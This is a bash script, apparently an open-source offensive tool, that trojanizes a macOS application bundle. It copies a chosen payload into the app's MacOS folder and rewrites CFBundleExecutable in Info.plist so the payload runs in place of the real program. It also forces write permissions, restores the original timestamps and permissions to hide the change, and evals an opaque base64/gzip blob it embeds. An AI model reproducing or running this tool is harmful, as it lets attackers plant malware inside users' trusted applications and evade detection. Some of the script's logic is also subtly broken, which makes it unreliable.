#!/bin/bash
# License: The MIT License (MIT)
# Author Zuzzuc https://github.com/Zuzzuc/

# Injects Payload into application

# Is it possible to have two executabels launch on app init? That way it should be harder to detect the payload



## Workflow

# 0(Optional) make inline compitable
# 1. Setup basic functions(And error management)
# 2. Read arguments
# 3. Validate arguments
# 4. Setup advanced functions (Import PlistKeyMod?)
#
# 5. Begin injection phase
# 6. Gather information
# 7. Remove obstacles
# 8. Inject payload
# 9. Hide traces
# 10. Exit
## /Workflow


### 1 Basic functions

b64gzdecode(){
	# Input is $1 and optionally $2, where $1 is a string generated by b64gz.sh and $2 is either 'print' or 'evaluate'(defaults to print), to either print the decoded string to stdout or to evaluate the content of the string.
	if [ "$2" == "print" ] || [ -z "$2" ];then
		echo "$1" | base64 -D | gzip -d
	elif [ "$2" == "evaluate" ];then
		eval "$(echo "$1" | base64 -D | gzip -d)"
	else
		return 1
	fi
}

## 1.1 Error handler 
catch_err(){
	# Input is $1 and optionally $2 and $3, where $1 is the error code description to display, $2 can be specified to override the default error message and $3 is used to supply a string that can be displayed in the error message.
	if [ -z "$2" ];then
		case "$1" in
		1)
				echo "Unknown error encountered."
				;;
			2)
				echo "Unknown argument supplied. Failing argument was '$3'."
				;;
			3)
				echo "Payload does not exist. Supplied path was '$3'."
				;;
			4)
				echo "Target application does not exist. Supplied path was '$3'."
				;;
			5)
				echo "The target '$3' is not a OSX application."
				;;
			6)
				echo "Unable to obtain write permission for '$3'."
				;;
			test)
				echo "This is a test error message"
				;;
		esac
	else
		echo "$2"
	fi
	# Inline not currently supported
	#error_code=$1
	exit "$1"
}

### 2 Read arguments

## 2.1 Setup default vars

hidden=true
exitOnObstructions=true

## 2.2 Read arguments

	# Arguments we:
	# payload x
	# app/target x
	# hide traces (DEF: ON) x
	# exit on no write permission/other obstacles (DEF: ON) x
	# permission on payload (DEF: same as main) x
	# 
	# What more?
	## //-
if [ "$*" != "" ];then                   
	for i in "$@";do				                           
		case "$i" in	       
		"$0") # If this script gets called as a standalone script the executable path will be supplied, so we skip it.
		continue
		;;
			-t=*|--target=*)
				target="${i#*=}" && target="${target/\\/}" && target="${target%${target##*[![:space:]]}}"
			;;
			-p=*|--payload=*)
				payload="${i#*=}" && payload="${payload/\\/}" && payload="${payload%${payload##*[![:space:]]}}"
			;;
			-nohide)
				hidden=false
			;;
			-f|--force)
				exitOnObstructions=false
				;;
			-pn=*|--payloadname=*)
				payloadname="${i#*=}" && payloadname="${payloadname/\\/}" && payloadname="${payloadname%${payloadname##*[![:space:]]}}"
				;;
			-pp=*|--payloadpermission=*)
				permission="${i#*=}"
				;;
		*)
			catch_err "2" "" "$i"
			;;
		esac
	done
fi

### 3 Validate arguments

# Validate payload
if [ ! -f "$payload" ];then
	catch_err "3" "" "$payload"
fi
	
# Validate target
if [ ! -d "$target" ] && [ -r "$target" ];then
	catch_err "4" "" "$target"
elif [ "${target:${#target}-4}" != ".app" ];then
	catch_err "5" "" "$target"
fi


### 4 Setup advanced functions

# Import PlistKeyMod
b64gzdecode "H4sIAGfgbloCA5VW204cORB9tr+iYpRMQOlZQS4v7PAURYtWiSKxeUIIWd1u2poeu2W7h2VD/n1dvvRtBq32AbDdp47rcqoMpd9bad2f4umrrt6e/qSyhltgDF5t8PfdpWuEokT8Ld39Tldiw4xwvVGMitaK2QdcMlpLSjsjlbvvLX8QSElE2WgoBLAfeATSwuTStW2guK23u/3d5nbP217c+X1zx+gvSkvuyuZeGBN4TuBadb1Dgnfw2AgjANfeRfAQbaD0jkAlbGlk56RW4DRU0nYtf1pTEkIr/pnGRUpuBR5IRQGAECDnp3FFotvs7Sl801DLVoDtu66VolqzDLm8TKuLQ6ubTpSy9nDYiqd3sFp5n7kFpR3UuleVvzO4jtRHGN8fMn5BJ1YrqLSIPD7l1h2x/XBo+xVT421ltMRQtHFHY/n4ws3Gx7P34SQKDl17/PpPC4Ifaqv0owJuHvqdUG5MJHzhspXqAT8h72p1yHb2AttY8jVWqBI171sHO2GDyialz5yZUlhehlXQcDwK1BHoJRw+Iv898m9Qiidw45XfDffsubGUYvE23i73Bq8Y9eXGo6BlXOjeedVuGO+dZhSZ/uCq8gmVqOajHUcoqX1wEjXC2GWlMXwy02vYsh2XyncQO/UbUmrlpOoFjbESUtSbs+eiCE4Oaay9T/DmDUz/pk/ZlY13ZR2qO7RKKkGON27H/BHfnEEkC3Hkr0MjA/sYboXsjVwUp9gGnzGJg8spowvgLgBD5gdkrMMBdB+gsSIDdijQAqwDOFUto4HkMh7gG49uRNtl3hP4jgMQ8CwnYDISF+Zno9myT7LxJHmfGNaHzVIYSh00TSqtRJrMns4KAxb7TemB0/pBOOE7T0w4tqdCvPnr8/U3X3z8OhwGAQ+zc8gHYsbkkN22kgaKDttpSouiCg3iWZ+fD0ZxgL1azuekt6DTJL0k06KeAU1CmQiZSTn5HW9NZznAbD9azF++ce4E2ih5spD0Rcpi7BA6hf0nK1z9T+rwO2NT181fBDqneD9QoGmyPMmvWsddMw5kSo6pAw1FO03po5FOzIrnxziWJweIW+WLcc7SJtaFHq/MVGUHlbH+zSkkPl74PwTY11frs99/e33lf1jMXc5GQL6AmcX+WVa+LWqpwuO8iPpiFnXspesacLT48aamjyfMmunD2Ey/6L/hF3g5WgkAAA==" "evaluate"

### 5 Begin injection phase
# This is where the fun begins...


### 6 Gather information

# Get original executable path
originalExecutable="$target/Contents/MacOS/$(PlistKeyMod -f="$target/Contents/Info.plist" -k="CFBundleExecutable")"
	
reconTargets=("$target" "$target/Contents" "$target/Contents/Info.plist" "$target/Contents/MacOS" "$originalExecutable")

	
# Get timestamps and permissions for reconTargets
for ((i=0;i<=$((${#reconTargets[@]}-1));i++));do
	timestamp[i]="$(stat -f "%Sm" -t "%m%d%H%M%y" "${reconTargets[i]}")"
	permissions[i]="$(stat -f '%A %a %N' "${reconTargets[i]}")"
done

# Setup Payload name
if [ -z "$payloadname" ];then
	payloadname="$RANDOM"
	while [ -f "$target/Contents/MacOS/$payloadname" ];do
		payloadname="$RANDOM$RANDOM"
	done
fi

# Setup Payload permission
if [ -z "$permission" ];then
	permission="$(stat -f '%A %a %N' "${reconTargets[5]}")"
fi

### 7 Remove obstacles

# aka set permissions to write to the wanted places 

if [ "$exitOnObstructions" == "false" ];then

	# Check for potential obstacles and solve them
	
	# Check if we can write, and if not update file permission
	for ((i=0;i<=$((${#reconTargets[@]}-1));i++));do
		if [ ! -w "${reconTargets[i]}" ];then
			chmod 755 "${reconTargets[i]}"
			if [ ! -w "${reconTargets[i]}" ];then
				# Failed to obtain write permission. Exit if it is one of the files we want to modify.
				if [ "$i" == "2" ] || [ "$i" == "3" ];then
					catch_err "6" "" "${reconTargets[i]}"
				fi
			fi
		fi
	done
fi

### 8 Inject payload

# Drop payload
cp -T "$payload" "$payloadname"

# Rebind app to launch payload instead of old executable
PlistKeyMod -f="$target/Contents/Info.plist" -k="CFBundleExecutable" -v="$payloadname"
# Well that was much easier with that library...

### 9 Hide traces
chmod "$permission" "$target/Contents/MacOS/$payloadname"
if [ "$hidden" == "true" ];then

	# Restore permissions
	for ((i=0;i<=$((${#reconTargets[@]}-1));i++));do
		chmod "${permissions[i]}" "${reconTargets[i]}"
	done

	# Restore timestamps
	for ((i=0;i<=$((${#reconTargets[@]}-1));i++));do
		touch -m "${timestamp[i]}" "${reconTargets[i]}"
	done
	# Set the dropped payloads timestamp to same as original executable
	touch -m "${timestamp[5]}" "$target/Contents/MacOS/$payloadname}"
fi
### 10 Exit
# Thats all folks!

exit 0

